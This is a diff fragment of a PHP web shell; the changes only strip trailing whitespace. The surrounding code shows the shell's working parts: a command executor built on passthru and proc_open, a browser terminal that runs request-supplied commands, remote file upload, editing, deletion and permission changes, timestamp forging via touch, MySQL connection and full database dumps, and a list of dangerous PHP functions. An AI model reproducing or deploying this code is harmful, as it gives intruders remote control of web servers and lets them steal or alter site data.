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" />
 <style type="text/css">
 
 	<?php if(strtolower($config['themes']) == 'd4rk'): ?>
 	:root {
-		--background-color:#000; 
+		--background-color:#000;
 		--color:#00ff00;
 		--txt-color: #fff;
 		--txt-hover-color: #fff;
@@ -278,7 +278,7 @@ $start=microtime(true);                    // Time Pageload
 
 	<?php if(strtolower($config['themes']) == 'br34k'): ?>
 	:root {
-		--background-color:#fff; 
+		--background-color:#fff;
 		--color:#000;
 		--txt-color: #000;
 		--txt-hover-color: #666;
@@ -506,7 +506,7 @@ $cur=any("c",$_SESSION)?urld($_SESSION['c']):getcwd();
 $dir=any("d",$_REQUEST)?urld($_REQUEST['d']):$cur;
 $map=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$dir;
 
-function Unix() 
+function Unix()
 {
 	return(strtolower(substr(PHP_OS,0,3))!="win");
 }
@@ -560,10 +560,10 @@ function Execute($x)
 	}
 	elseif(function_exists('passthru'))
 	{
-		ob_start();		
+		ob_start();
 		$passthru=passthru($x);
 		$buff=ob_get_contents();
-		ob_end_clean();	
+		ob_end_clean();
 		return $buff;
 	}
 	elseif(function_exists('proc_open'))
@@ -776,7 +776,7 @@ function PostUrlContent($url,$content)
 		}
 
 		//stream_get_contents
-		if($handle=fopen($url,'r',false,$context)) 
+		if($handle=fopen($url,'r',false,$context))
 		{
 		    $contents=stream_get_contents($handle);
 		    fclose($handle);
@@ -787,7 +787,7 @@ function PostUrlContent($url,$content)
 		if($handle=fopen($url,'r',false,$context))
 		{
 			$contents="";
-			while(!feof($handle)) 
+			while(!feof($handle))
 			{
 				$contents.=fread($handle,10240);
 			}
@@ -799,18 +799,18 @@ function PostUrlContent($url,$content)
 	return $results;
 }
 
-function GetFileType($x) 
+function GetFileType($x)
 {
-	if(is_file($x)) 
+	if(is_file($x))
 	{
 		return pathinfo($x)['extension'];
 	}
-	elseif(is_dir($x)) 
-	{ 
+	elseif(is_dir($x))
+	{
 		return "dir";
 	}
-	elseif(is_link($x)) 
-	{ 
+	elseif(is_link($x))
+	{
 		return "link";
 	}
 	else
@@ -819,9 +819,9 @@ function GetFileType($x)
 	}
 }
 
-function GetFileTime($x,$y) 
+function GetFileTime($x,$y)
 {
-	switch($y) 
+	switch($y)
 	{
 		case "create":return date("Y-m-d H:i:s",@filectime($x));break;
 		case "modify":return date("Y-m-d H:i:s",@filemtime($x));break;
@@ -829,10 +829,10 @@ function GetFileTime($x,$y)
 	}
 }
 
-function GetFilePerm($x) 
+function GetFilePerm($x)
 {
 	$perms=@fileperms($x);
-	switch ($perms & 0xF000) 
+	switch ($perms & 0xF000)
 	{case 0xC000:$info='s';break;case 0xA000:$info='l';break;
 	case 0x8000:$info='r';break;case 0x6000:$info='b';break;
 	case 0x4000:$info='d';break;case 0x2000:$info='c';break;
@@ -846,7 +846,7 @@ function GetFilePerm($x)
 	return sprintf('%s [%s]',$info,substr(decoct($perms),2));
 }
 
-function GetFileSize($x) 
+function GetFileSize($x)
 {
 	$x=abs($x);
 	$size=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
@@ -854,15 +854,15 @@ function GetFileSize($x)
 	return sprintf('%.2f '.$size[$exp],($x/pow(1024,floor($exp))));
 }
 
-function GetUser($x) 
-{	
-	if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
+function GetUser($x)
+{
+	if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid'))
 	{
 		$uid=posix_getpwuid(posix_getuid());
 		$gid=posix_getgrgid(posix_getgid());
-		
-		switch($x) 
-		{	
+
+		switch($x)
+		{
 			case 'usr':return $uid['name'];break;
 			case 'uid':return $uid['uid'];break;
 			case 'grp':return $gid['name'];break;
@@ -878,14 +878,14 @@ function GetUser($x)
 			case 'grp':return "?";break;
 			case 'gid':return getmygid();break;
 		}
-	}	
+	}
 }
 
-function GetOwnerGroup($x) 
+function GetOwnerGroup($x)
 {
 	if(Unix())
 	{
-		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
+		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid'))
 		{
 			$user=posix_getpwuid(fileowner($x));
 			$group=posix_getgrgid(filegroup($x));
@@ -895,11 +895,11 @@ function GetOwnerGroup($x)
 	return "?:?";
 }
 
-function GetFileOwnerGroup($x) 
+function GetFileOwnerGroup($x)
 {
 	if(Unix())
 	{
-		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
+		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid'))
 		{
 			$user=posix_getpwuid(fileowner($x));
 			$group=posix_getgrgid(filegroup($x));
@@ -909,9 +909,9 @@ function GetFileOwnerGroup($x)
 	return "?:?/?:?";
 }
 
-function GetSafeMode() 
+function GetSafeMode()
 {
-	if(strtolower(ini_get("safe_mode"))=='on') 
+	if(strtolower(ini_get("safe_mode"))=='on')
 	{
 		$safemod="<font class='off'>ON</font>";
 	}
@@ -922,7 +922,7 @@ function GetSafeMode()
 	return $safemod;
 }
 
-function MapDirectory($x) 
+function MapDirectory($x)
 {
 	$map="";
 	$d=str_replace("\\",_,$x);
@@ -931,26 +931,26 @@ function MapDirectory($x)
 		$d=realpath(".");
 	}
 	elseif(realpath($d))
-	{	
+	{
 		$d=realpath($d);
 	}
 	$d=str_replace("\\",_,$d);
-	if(substr($d,-1)!=_) 
-	{	
+	if(substr($d,-1)!=_)
+	{
 		$d.=_;
 	}
 	$d=str_replace("\\\\","\\",$d);
 	$pd=$e=explode(_,substr($d,0,-1));
 	$i=0;
-	foreach($pd as $b) 
+	foreach($pd as $b)
 	{
 		$t="";
 		$j=0;
-		foreach($e as $r) 
+		foreach($e as $r)
 		{
 			$t.=$r._;
-			if($j==$i) 
-			{	
+			if($j==$i)
+			{
 				break;
 			}
 			$j++;
@@ -961,20 +961,20 @@ function MapDirectory($x)
 	return rtrim($map,_);
 }
 
-function MapDrive($x) 
+function MapDrive($x)
 {
-	if(!Unix()) 
+	if(!Unix())
 	{
 		$v=explode("\\",$x);
 		$v=$v[0];
 		$l="";
-		foreach(range("A","Z") as $lt) 
+		foreach(range("A","Z") as $lt)
 		{
 			$drive=is_dir($lt.":\\");
-			if($drive) 
+			if($drive)
 			{
 				$l.="<a href=\"?d=".urle($lt.":\\")."\">[";
-				if(strtolower($lt.':')!=strtolower($v)) 
+				if(strtolower($lt.':')!=strtolower($v))
 				{
 					$l.=$lt;
 				}
@@ -989,7 +989,7 @@ function MapDrive($x)
 	}
 }
 
-function MainMenu() 
+function MainMenu()
 {
 	$menu=array(
 		"ExpL"          => "?d=".urle(getcwd()),
@@ -1028,12 +1028,12 @@ function MainMenu()
 	return $nu;
 }
 
-function MenuTools($x) 
+function MenuTools($x)
 {
 	global $menu_tools;
 	$ol="<div class='menu-tools'><ul>";
 	$menu_tools=$x;
-	
+
 	foreach($menu_tools as $k => $v)
 	{
 		$active=$_REQUEST['z']==$k?"class='active'":"";
@@ -1118,7 +1118,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 	if(any("file",$_REQUEST)&&$_REQUEST['file']=="New File")
 	{
 		$file=trim($dir._.$_REQUEST['what']);
-		
+
 		if(file_exists($file))
 		{
 			printf("<center style='margin-bottom:10px'><b class='off'>Can't create New File!</b></center>");
@@ -1131,7 +1131,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 		}
 	}
 	if(any("directory",$_REQUEST)&&$_REQUEST['directory']=="New Dir")
-	{	
+	{
 		$dire=trim($_REQUEST['what']);
 
 		@chdir($dir);
@@ -1146,14 +1146,14 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 		}
 	}
 	if(any("upload",$_REQUEST)&&$_REQUEST['upload']=="Upload")
-	{	
+	{
 		$upload=$dir._.trim(basename($_FILES["what"]["name"]));
 
-		if(move_uploaded_file($_FILES["what"]["tmp_name"],$upload)) 
+		if(move_uploaded_file($_FILES["what"]["tmp_name"],$upload))
 		{
 			printf("<center style='margin-bottom:10px'><b class='on'>File %s has been uploaded</b></center>",basename($_FILES["what"]["name"]));
 		}
-		else 
+		else
 		{
 			printf("<center style='margin-bottom:10px'><b class='off'>&#10005; Can't upload new file! &#10005;</b></center>");
 		}
@@ -1193,7 +1193,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 			{
 				$view="?a=v&r=".urle($filedir);
 			}
-			
+
 			if($file==".")
 			{
 				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete Directory [ /".basename($dir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
@@ -1211,7 +1211,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 				}
 				else
 				{
-					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Filename [ ".basename($filedir)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
+					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Filename [ ".basename($filedir)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";
 					$count_files++;
 				}
 			}
@@ -1359,7 +1359,7 @@ if(any("r",$_REQUEST))
 		}
 
 		$nu="";
-		
+
 		foreach($menu as $key => $val)
 		{
 			$idxkey=substr($val,1,1);
@@ -1395,9 +1395,9 @@ if(any("r",$_REQUEST))
 			{
 				$open=fopen($file,'r');
 
-				if($open) 
+				if($open)
 				{
-					while(!feof($open)) 
+					while(!feof($open))
 					{
 						$source.=htmlentities(fread($open,(1024*4)));
 					}
@@ -1410,7 +1410,7 @@ if(any("r",$_REQUEST))
 					<input type='Submit' value='Save file' name='save'/>
 					<label>%s</label>
 				</form>",$source,$status);
-		
+
 			if(any("status",$_SESSION)) unset($_SESSION['status']);
 
 			if(any("save",$_REQUEST))
@@ -1446,11 +1446,11 @@ if(any("r",$_REQUEST))
 			{
 				$path=pathinfo(trim($file));
 				$newname=$path['dirname']._.trim($_REQUEST['name']);
-				if(!rename(trim($file),$newname)) 
+				if(!rename(trim($file),$newname))
 				{
 				    $_SESSION['status']='Whoops, something went wrong...';
 				}
-				else 
+				else
 				{
 				    $_SESSION['status']='Renamed file with success';
 				}
@@ -1471,11 +1471,11 @@ if(any("r",$_REQUEST))
 			if(any("chmod",$_REQUEST))
 			{
 				$octal=octdec($_REQUEST['octal']);
-				if(!chmod(trim($file),$octal)) 
+				if(!chmod(trim($file),$octal))
 				{
 				    $_SESSION['status']='Whoops, something went wrong...';
 				}
-				else 
+				else
 				{
 				    $_SESSION['status']='Chmod file with success';
 				}
@@ -1486,7 +1486,7 @@ if(any("r",$_REQUEST))
 		if($_REQUEST['a']=='cwn')
 		{
 			$own='';
-			if(function_exists('posix_getpwuid')) 
+			if(function_exists('posix_getpwuid'))
 			{
 				$user=posix_getpwuid(fileowner($x));
 				$own=$user['name'];
@@ -1503,11 +1503,11 @@ if(any("r",$_REQUEST))
 			if(any("chown",$_REQUEST))
 			{
 				$own=$_REQUEST['own'];
-				if(!chown(trim($file),$own)) 
+				if(!chown(trim($file),$own))
 				{
 				    $_SESSION['status']='Whoops, something went wrong...';
 				}
-				else 
+				else
 				{
 				    $_SESSION['status']='Chown file with success';
 				}
@@ -1518,7 +1518,7 @@ if(any("r",$_REQUEST))
 		if($_REQUEST['a']=='cgp')
 		{
 			$grp='';
-			if(function_exists('posix_getgrgid')) 
+			if(function_exists('posix_getgrgid'))
 			{
 				$group=posix_getgrgid(filegroup($x));
 				$grp=$group['name'];
@@ -1535,11 +1535,11 @@ if(any("r",$_REQUEST))
 			if(any("chgrp",$_REQUEST))
 			{
 				$grp=$_REQUEST['grp'];
-				if(!chgrp(trim($file),$grp)) 
+				if(!chgrp(trim($file),$grp))
 				{
 					$_SESSION['status']='Whoops, something went wrong...';
 				}
-				else 
+				else
 				{
 					$_SESSION['status']='Chgrp file with success';
 				}
@@ -1560,11 +1560,11 @@ if(any("r",$_REQUEST))
 			if(any("touch",$_REQUEST))
 			{
 				$time=$_REQUEST['time'];
-				if(!touch(trim($file),strtotime($time))) 
+				if(!touch(trim($file),strtotime($time)))
 				{
 				    $_SESSION['status']='Whoops, something went wrong...';
 				}
-				else 
+				else
 				{
 				    $_SESSION['status']='Touched file with success';
 				}
@@ -1628,7 +1628,7 @@ if(any("r",$_REQUEST))
 				}
 			}
 		}
-		
+
 		if($_REQUEST['a']=='h')
 		{
 			$c=file_get_contents($file);
@@ -1689,22 +1689,22 @@ if(any("r",$_REQUEST))
 				{
 					if ($_REQUEST['a']=='cp')
 					{
-						if(!copy(trim($source),trim($dest))) 
+						if(!copy(trim($source),trim($dest)))
 						{
 						    $_SESSION['status']='Whoops, cannot copying...';
 						}
-						else 
+						else
 						{
 						    $_SESSION['status']="Copy file with success <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
 						}
 					}
 					elseif($_REQUEST['a']=='mv')
 					{
-						if(!copy(trim($source),trim($dest))) 
+						if(!copy(trim($source),trim($dest)))
 						{
 						    $_SESSION['status']='Whoops, cannot moving...';
 						}
-						else 
+						else
 						{
 						    if(Remove($source))
 						    {
@@ -1751,7 +1751,7 @@ if(any("r",$_REQUEST))
 				exit;
 			}
 		}
-		
+
 		if($_REQUEST['a']=='x')
 		{
 			if(file_exists($file))
@@ -1761,7 +1761,7 @@ if(any("r",$_REQUEST))
 					header("location:".$back);
 				}
 			}
-			
+
 			print '<font class="off">Cannot Delete</font>';
 		}
 	}
@@ -1805,7 +1805,7 @@ if(any("x",$_REQUEST))
 		'socket_set_option','socket_shutdown','socket_strerror','socket_write','str_rot13','stream_select','stream_socket_server',
 		'symlink','syslog','system','tp_exec','virtual','xmlrpc_entity_decode');
 
-		sort($security); 
+		sort($security);
 		$fucks=array_unique(array_merge($disable_functions,$security));
 		$table="";
 		$enable=0;
@@ -1943,7 +1943,7 @@ if(any("x",$_REQUEST))
 		{
 			$process="";
 			$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);
-			/* 
+			/*
 			$result=mysql_list_processes($sql);
 			while($row=mysql_fetch_assoc($result))
 			{
@@ -1953,9 +1953,9 @@ if(any("x",$_REQUEST))
 			    	$row["Id"],$row["Host"],$row["db"],
 			    	$row["Command"],$row["Time"]);
 			}
-			mysql_free_result($result); 
+			mysql_free_result($result);
 			*/
-			
+
 			printf("<div class='database-session'>
 						<div class='database-query'>
 							<form action='?x=db&xa=qry' method='post'>
@@ -2000,7 +2000,7 @@ if(any("x",$_REQUEST))
 						<div class='clr'></div>
 					</div>
 					",$query,$process,$dir,$status);
-		
+
 		}
 		else
 		{
@@ -2032,7 +2032,7 @@ if(any("x",$_REQUEST))
 		}
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db")
-		{	
+		{
 			$cn=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['dbas'],$_REQUEST['port']);
 
 			$_SESSION['host']=$_REQUEST['host'];
@@ -2163,7 +2163,7 @@ if(any("x",$_REQUEST))
 		{
 			$database=$_REQUEST['database'];
 			$output=$_REQUEST['output'];
-			if (!file_exists($output)&&!empty($database)) 
+			if (!file_exists($output)&&!empty($database))
 			{
 				$link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
 				mysqli_set_charset($link,'utf8');
@@ -2189,18 +2189,18 @@ if(any("x",$_REQUEST))
 					if ($num_rows!==0) {
 						$row3=@mysqli_fetch_fields($result);
 						$return.='INSERT INTO '.$table.'( ';
-						foreach ($row3 as $th) 
-						{ 
+						foreach ($row3 as $th)
+						{
 							$return.='`'.$th->name.'`,';
 						}
 						$return=substr($return,0,-2);
 						$return.=' ) VALUES';
-						for ($i=0;$i < $num_fields;$i++) 
+						for ($i=0;$i < $num_fields;$i++)
 						{
 							while($row=mysqli_fetch_row($result))
 							{
 								$return.="\n(";
-								for($j=0;$j<$num_fields;$j++) 
+								for($j=0;$j<$num_fields;$j++)
 								{
 									$row[$j]=addslashes($row[$j]);
 									$row[$j]=preg_replace("#\n#","\\n",$row[$j]);
@@ -2211,7 +2211,7 @@ if(any("x",$_REQUEST))
 									$return.=");";
 								}else {
 									$return.="),";
-								}  
+								}
 							}
 						}
 					}
@@ -2223,13 +2223,13 @@ if(any("x",$_REQUEST))
 				$handle=fopen($output,'w+');
 				fwrite($handle,$return);
 				fclose($handle);
-				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($output),basename($output));	    
+				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($output),basename($output));
 			}
 			else
 			{
 				$_SESSION['status']="<span class=off>Dump Error</span>";
 			}
-			
+
 			header('location:'.php_self.'?x=db');
 		}
 
@@ -2242,7 +2242,7 @@ if(any("x",$_REQUEST))
 				<form onsubmit='return false;'>
 					<label id='curdir-terminal'>$ %s:</label>
 					<input type='text' id='terminal-input' autocomplete='off' onfocus=\"\" onkeydown=\"
-						if(event.keyCode==13) 
+						if(event.keyCode==13)
 						{
 							temp=this.value;
 							this.value='';
@@ -2254,7 +2254,7 @@ if(any("x",$_REQUEST))
 			</div>",Execute('whoami'),$dir);
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals")
-		{	
+		{
 			ob_clean();
 			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
 			@chdir($dir);
@@ -2268,7 +2268,7 @@ if(any("x",$_REQUEST))
 			exit;
 		}
 		elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir")
-		{	
+		{
 			ob_clean();
 			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
 			if (preg_match('/cd (.*)/',$command,$dirx))
@@ -2317,7 +2317,7 @@ if(any("x",$_REQUEST))
 						<fieldset>
  							<legend>Status</legend>
